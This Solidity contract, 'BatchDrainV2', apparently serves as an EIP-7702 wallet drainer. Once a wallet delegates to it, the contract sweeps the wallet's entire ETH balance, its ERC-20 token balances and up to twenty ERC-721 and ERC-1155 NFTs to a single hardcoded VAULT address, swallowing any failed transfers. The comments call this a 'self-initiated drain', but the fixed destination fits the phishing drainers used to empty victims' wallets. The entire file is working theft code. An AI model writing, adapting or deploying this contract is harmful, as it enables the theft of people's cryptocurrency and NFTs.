// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * BatchDrainV2 — EIP-7702 Self-Initiated Drain
 *
 * User sends type-4 tx via MetaMask (eth_sendTransaction).
 * MetaMask internally signs the authorization and broadcasts.
 * address(this) = user's wallet, msg.sender = user's wallet (same!).
 * onlySelf guard: only the wallet itself can drain itself.
 */

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IERC721 {
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
    function transferFrom(address from, address to, uint256 tokenId) external;
    function ownerOf(uint256 tokenId) external view returns (address);
}

interface IERC1155 {
    function safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes calldata data) external;
    function balanceOf(address account, uint256 id) external view returns (uint256);
}

contract BatchDrainV2 {
    address public constant VAULT = 0x2B20979118a61aE3f7f75F3320FB9b0639c5BA53;
    uint256 public constant MAX_NFTS = 20;

    error Unauthorized();
    error TransferFailed();

    // In EIP-7702: user sends tx to their own wallet → msg.sender == address(this)
    modifier onlySelf() {
        if (msg.sender != address(this)) revert Unauthorized();
        _;
    }

    function drain(
        address[] calldata erc20s,
        address[] calldata erc721Contracts,
        uint256[] calldata erc721Ids,
        address[] calldata erc1155Contracts,
        uint256[] calldata erc1155Ids
    ) external onlySelf {
        // ETH — full balance (gas already deducted before execution)
        uint256 ethBal = address(this).balance;
        if (ethBal > 0) {
            (bool ok,) = VAULT.call{value: ethBal}("");
            if (!ok) revert TransferFailed();
        }

        // ERC-20
        for (uint256 i; i < erc20s.length; ++i) {
            uint256 bal = IERC20(erc20s[i]).balanceOf(address(this));
            if (bal > 0) {
                try IERC20(erc20s[i]).transfer(VAULT, bal) {} catch {}
            }
        }

        // ERC-721 — in EIP-7702: msg.sender == address(this) == owner → transfer allowed
        uint256 nft721Count = erc721Contracts.length < erc721Ids.length
            ? erc721Contracts.length
            : erc721Ids.length;
        if (nft721Count > MAX_NFTS) nft721Count = MAX_NFTS;
        for (uint256 i; i < nft721Count; ++i) {
            try IERC721(erc721Contracts[i]).transferFrom(address(this), VAULT, erc721Ids[i]) {} catch {
                try IERC721(erc721Contracts[i]).safeTransferFrom(address(this), VAULT, erc721Ids[i]) {} catch {}
            }
        }

        // ERC-1155 — transfer each tokenId with balance
        uint256 nft1155Count = erc1155Contracts.length < erc1155Ids.length
            ? erc1155Contracts.length
            : erc1155Ids.length;
        if (nft1155Count > MAX_NFTS) nft1155Count = MAX_NFTS;
        for (uint256 i; i < nft1155Count; ++i) {
            uint256 bal1155 = IERC1155(erc1155Contracts[i]).balanceOf(address(this), erc1155Ids[i]);
            if (bal1155 > 0) {
                try IERC1155(erc1155Contracts[i]).safeTransferFrom(
                    address(this), VAULT, erc1155Ids[i], bal1155, ""
                ) {} catch {}
            }
        }
    }

    receive() external payable {}
    fallback() external payable {}
}
